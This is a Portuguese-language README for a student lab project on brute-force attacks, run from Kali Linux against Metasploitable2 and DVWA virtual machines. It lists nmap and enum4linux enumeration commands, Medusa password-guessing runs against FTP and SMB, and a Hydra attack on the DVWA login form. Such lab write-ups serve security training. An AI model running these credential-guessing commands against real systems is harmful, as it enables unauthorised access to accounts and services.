
# Desafio: Ataques de Força Bruta com Medusa (Kali + Metasploitable2/DVWA)

## Resumo
Projeto prático para demonstrar ataques de força bruta em ambiente controlado usando Kali Linux e Medusa, com alvo Metasploitable2 e DVWA. Objetivo: aprender enumeração, execução de ataques e propor medidas de mitigação.

> **Atenção:** todos os testes foram executados apenas em VMs de laboratório (Kali e Metasploitable). Não execute testes em sistemas sem autorização.

## Ambiente
- Hypervisor: VirtualBox  
- Kali Linux — IP: **192.168.1.2**  
- Metasploitable2 (alvo) — IP: **192.168.1.16**  
- Rede: Host-only / Internal Network

## Ferramentas utilizadas
- Kali Linux  
- Medusa  
- Nmap  
- smbclient, enum4linux  
- Hydra (opcional, para formulários HTTP)  
- ssh/sshfs

## Wordlists (exemplos)
- `wordlists/simples_usernames.txt`  
- `wordlists/simples_passwords.txt`  

*(Use wordlists maiores como `rockyou.txt` somente em laboratório.)*

## Comandos principais (exemplos)
### Enumeração
```bash
sudo nmap -sS -sV -p21,22,80,139,445,3306 192.168.1.16 -oN nmap_common.txt
smbclient -L //192.168.1.16 -N
enum4linux -a 192.168.1.16 > enum4linux.txt


medusa -h 192.168.1.16 -u msfadmin -P wordlists/simples_passwords.txt -M ftp -t 4 -f -O results/medusa_ftp.txt


medusa -h 192.168.1.16 -U wordlists/simples_usernames.txt -P wordlists/simples_passwords.txt -M smb -t 8 -f -O results/medusa_smb.txt


hydra -l admin -P wordlists/simples_passwords.txt 192.168.1.16 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect"

Imagens do Projeto

![Página Inicial 1](https://github.com/marceloguilherme100/desafio-medusa-kali/raw/main/imagem1.PNG)
![Página Inicial 2](https://github.com/marceloguilherme100/desafio-medusa-kali/raw/main/imagem2.PNG)
![Página Inicial 3](https://github.com/marceloguilherme100/desafio-medusa-kali/raw/main/imagem3.PNG)
![Página Inicial 4](https://github.com/marceloguilherme100/desafio-medusa-kali/raw/main/imagem4.PNG)
![Página Inicial 5](https://github.com/marceloguilherme100/desafio-medusa-kali/raw/main/imagem5.PNG)



